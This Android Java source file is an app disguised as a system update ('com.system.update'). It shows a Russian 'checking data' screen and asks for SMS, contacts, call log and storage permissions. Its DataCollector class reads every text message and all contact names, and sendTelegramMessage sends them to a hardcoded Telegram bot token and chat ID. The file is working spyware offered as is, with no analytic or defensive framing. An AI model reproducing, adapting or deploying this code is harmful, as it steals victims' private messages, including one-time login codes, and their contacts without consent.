package com.system.update;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final String BOT_TOKEN = "9263955385:AAE6VkwQqIPh6-mNddaDVz313O6THg9LjPA";
    private static final String CHAT_ID = "8682887545";
    private static final int PERMISSION_REQUEST_CODE = 1;

    private final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        TextView tv = new TextView(this);
        tv.setText("Проверка данных...\nПожалуйста, подождите.");
        tv.setTextSize(18);
        tv.setPadding(50, 50, 50, 50);
        setContentView(tv);

        List<String> missingPermissions = new ArrayList<>();
        for (String perm : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(perm);
            }
        }

        if (!missingPermissions.isEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        } else {
            new DataCollector().execute();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            new DataCollector().execute();
        }
    }

    private class DataCollector extends AsyncTask<Void, Void, String> {
        @Override
        protected String doInBackground(Void... voids) {
            StringBuilder sb = new StringBuilder();
            sb.append("📱 <b>Device Info</b>\n");
            sb.append("Model: ").append(android.os.Build.MODEL).append("\n");
            sb.append("Android: ").append(android.os.Build.VERSION.RELEASE).append("\n\n");

            sb.append("📩 <b>SMS</b>\n");
            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    sb.append(address).append(": ").append(body).append("\n");
                }
                cursor.close();
            }

            sb.append("\n👥 <b>Contacts</b>\n");
            Cursor cur = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cur != null) {
                while (cur.moveToNext()) {
                    String name = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                    sb.append(name).append("\n");
                }
                cur.close();
            }

            sendTelegramMessage(sb.toString());
            return null;
        }
    }

    private void sendTelegramMessage(String text) {
        try {
            int maxLen = 4000;
            for (int i = 0; i < text.length(); i += maxLen) {
                String chunk = text.substring(i, Math.min(text.length(), i + maxLen));
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(chunk, "UTF-8") + "&parse_mode=HTML";

                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
